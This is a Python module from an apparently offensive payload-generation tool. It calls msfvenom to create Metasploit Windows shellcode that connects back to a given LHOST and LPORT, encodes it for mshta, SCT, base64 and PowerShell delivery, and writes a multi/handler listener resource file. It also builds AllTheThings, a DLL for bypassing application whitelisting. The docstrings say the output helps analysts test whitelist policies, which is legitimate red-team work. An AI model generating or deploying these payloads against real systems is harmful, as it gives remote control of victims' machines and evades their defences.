from display import *

import os
import re
import base64
import string
import random

"""
This module is used for payload generation and operations.
"""

class Generator():
    """
    This class is used for payload generation and operations.
    """
    def genShellcode(self, host, port, arch, name, payload, shellProcess=None):
        """
        Generates shellcode with msfvenom.

        :param host: the ip address
        :param port: the port
        :param arch: the processor architecture
        :param name: name of the payload
        :param payload: type of metasploit payload
        :param shellProcess: encoding process to apply to shellcode
        :type host: string
        :type port: string
        :type arch: string
        :type name: string
        :type payload: string
        :type shellProcess: string
        :returns: shellcode
        :rtype: string

        .. todo: remove the file write
        """
        code = ''
        form = 'c'
        uuid = name + str(self.id_generator())

        if shellProcess == 'hexEncode':
            form = "c"
        elif shellProcess == 'decEncode':
            form = "vba"
        elif shellProcess == 'b64Encode':
            form = "raw"
        elif shellProcess == 'pshEncode':
            form = "psh"

        if (arch == "x86"):
            os.system("msfvenom -a x86 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}\
             > /tmp/metasploit 2> /dev/null".format(payload, uuid, host, port, form))
            self.genMetasploitReourceFile(host, port, payload)
            self.genAnalystCSVFile(name, uuid)
        else:
            os.system("msfvenom -a x86 --platform windows -p {0} PayloadUUIDTracking=true PayloadUUIDName={1} LHOST={2} LPORT={3} -f {4}\
             > /tmp/metasploit 2> /dev/null".format(payload.replace("windows/", "windows/x64/"), uuid, host, port, form))
            self.genMetasploitReourceFile(host, port, payload)
            self.genAnalystCSVFile(name, uuid)
        with open("/tmp/metasploit", 'rb') as f:
            code = f.read()

        shellcode = str(code)

        if shellProcess == 'hexEncode':
            shellcode = self.hexEncode(shellcode)
        elif shellProcess == 'decEncode':
            shellcode = self.decEncode(shellcode)
        elif shellProcess == 'b64Encode':
            shellcode = self.b64Encode(shellcode)
        elif shellProcess == 'pshEncode':
            shellcode = self.pshEncode(shellcode)

        return shellcode

    def encodeShellcode(self, shellcode, shellProcess):
        """
        Encodes shellcode.

        :param shellcode: the shellcode
        :param shellProcess: the shellcode encoding process
        :type shellcode: string
        :type shellProcess: string
        :returns: shellcode
        :rtype: string
        """
        if shellProcess == 'hexEncode':
            shellcode = self.hexEncode(shellcode)
        elif shellProcess == 'decEncode':
            shellcode = self.decEncode(shellcode)
        elif shellProcess == 'b64Encode':
            shellcode = self.b64Encode(shellcode)
        elif shellProcess == 'pshEncode':
            shellcode = self.pshEncode(shellcode)

        return shellcode

    def hexEncode(self, shellcode):
        """
        Hex encodes shellcode.

        :param shellcode: the shellcode
        :type shellcode: string
        :returns: shellcode
        :rtype: string

        .. note:: currently used to format mshta based payloads
        """
        shellcode = "0x" + shellcode[30:-5]
        shellcode = shellcode.replace("\\\\", ",0")
        shellcode = shellcode.replace("\"\\n\"", "\n")

        return shellcode

    def b64Encode(self, shellcode):
        """
        Base64 encodes the shellcode.

        :param shellcode: the shellcode
        :type shellcode: string
        :returns: shellcode
        :rtype: string
        """
        shellcode = str(base64.b64encode(shellcode.encode('utf-8')))
        shellcode = shellcode[2:-1]

        return shellcode

    def decEncode(self, shellcode):
        """
        Decimal encode the shellcode. Currently used for SCT payloads.

        :param shellcode: the shellcode
        :type shellcode: string
        :returns: shellcode
        :rtype: string
        """
        shellcode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", str(shellcode), flags=re.MULTILINE)
        shellcode = ''.join(i[0].replace('', '') for i in shellcode)

        k = shellcode.rfind(")\\r\\n\\n\\t")
        shellcode = shellcode[:k+5]

        even = 1
        lineEnd = " _\\r\\n"

        for i in range(0, len(shellcode)):
            if shellcode[i: i+len(lineEnd)] == lineEnd:
                if even == 2:
                    shellcode = shellcode[:i]+shellcode[i+len(lineEnd):]
                    even = even >> 1
                else:
                    shellcode = shellcode[:i]+" _\r\n"+shellcode[i+len(lineEnd):]
                    even = even << 1
        shellcode = shellcode[:-4]

        return(shellcode)

    def pshEncode(self, shellcode):
        """
        Powershell encode the shellcode. Credits to TrustedSec.

        :param shellcode: the shellcode
        :type shellcode: string
        :returns: shellcode
        :rtype: string
        """
        shellcode = "for (;;){\n  Start-sleep 60\n}" + shellcode
        shellcode = base64.b64encode(shellcode.encode('utf-8'))
        shellcode = shellcode.decode('utf-8')

        return shellcode

    def genRunScript(self, run_info):
        """
        Dynamically generate batch script to execute all the payloads.

        :param run_info: the info to execute a payload
        :type run_info: string
        """
        with open('./GenerateAll/gr8sct.bat', 'a+') as f:
            f.write(run_info + '\n')
            f.write('timeout 30 > NUL\n')

    def compileAllTheThings(self, name):
        """
        Compiles AllTheThings DLL 5 in 1 AWL on Linux.

        :param name: name of the payload
        :type name: string
        """
        build_steps = [
            "apt-get install mono-complete -y >/dev/null 2>&1",
            "git clone https://github.com/ConsciousHacker/AllTheThings >/dev/null 2>&1",
            "wget -O https://github.com/mono/nuget-binary/raw/master/nuget.exe >/dev/null 2>&1",
            "cp ./GenerateAll/allthethings.cs ./AllTheThings/AllTheThings/Program.cs >/dev/null 2>&1",
            "mono --runtime=v4.0 nuget.exe restore ./AllTheThings/AllTheThings.sln >/dev/null 2>&1",
            "mdtool build ./AllTheThings/AllTheThings/AllTheThings.csproj >/dev/null 2>&1",
            "cp ./AllTheThings/AllTheThings/bin/Debug/AllTheThings.dll ./GenerateAll/AllTheThings_{0}\
            .dll >/dev/null 2>&1".format(
                name),
            "sleep 10"
        ]

        for step in build_steps:
            os.popen(step)

    def genMetasploitReourceFile(self, host, port, payload):
        """
        Dynamically generates a Metasploit resource file.

        :param host: the ip address
        :param port: the port
        :param payload: type of metasploit payload
        :type host: string
        :type port: string
        :type payload: string

        .. todo:: make dynamic for architecture
        """
        msfrc = '''use exploit/multi/handler
set TimestampOutput true
set VERBOSE true
set ExitOnSession false
set EnableStageEncoding true
set AutoRunScript ./GenerateAll/payloadtracker.rc
set LHOST {0}
set LPORT {1}
set payload {2}
run -j'''.format(host, port, payload)

        with open('./GenerateAll/gr8sct.rc', 'w+') as f:
            f.write(msfrc)

    def genUUIDTrackingResouceFile(self):
        """
        Generates a Metasploit resource file to track UUIDs.

        This resource script automatically updates the analyst.csv file.
        It works by checking if the UUID has changed into Metasploit and then
        searches for the entry in anaylst.csv and marks the column TRUE.
        """
        msfrc = '''<ruby>
if session.payload_uuid.respond_to?(:puid_hex) && uuid_info = framework.uuid_db[session.payload_uuid.puid_hex]
    f = open("./GenerateAll/analyst.csv", "r+")
    f.each_line do |line|
        if line.include? uuid_info["PayloadUUIDName"].to_s
            f.puts line.gsub("FALSE", "TRUE")
        end
    end
    f.close
end
</ruby>'''
        with open('./GenerateAll/payloadtracker.rc', 'w+') as f:
            f.write(msfrc)

    def createAnalystCSVFile(self):
        """
        Creates the anaylst CSV file.

        The anaylst CSV file is for SOC/IR anaylsts to test
        as well as track the efficacy of their application whitelist policy.
        """
        with open("./GenerateAll/analyst.csv", 'w+') as f:
            f.write('bypass,uuid,sucessful\n')

    def genAnalystCSVFile(self, bypass, uuid):
        """
        Generates the anaylst CSV file with GenerateAll payloads.

        The anaylst CSV file is for SOC/IR anaylsts to test
        as well as track the efficacy of their application whitelist policy.
        """
        with open("./GenerateAll/analyst.csv", 'a') as f:
            f.write(bypass + ',' + uuid + ',' + 'FALSE' + '\n')

    def id_generator(self, size=6, chars=string.ascii_uppercase):
        """
        Psuedo-random UUID generator.

        :param size: the character length of the uuid
        :param chars: characters to use in generation
        :type size: int
        :type chars: list
        :returns: uuid
        :rtype: string

        """
        uuid = ''.join(random.choice(chars) for _ in range(size))

        return uuid
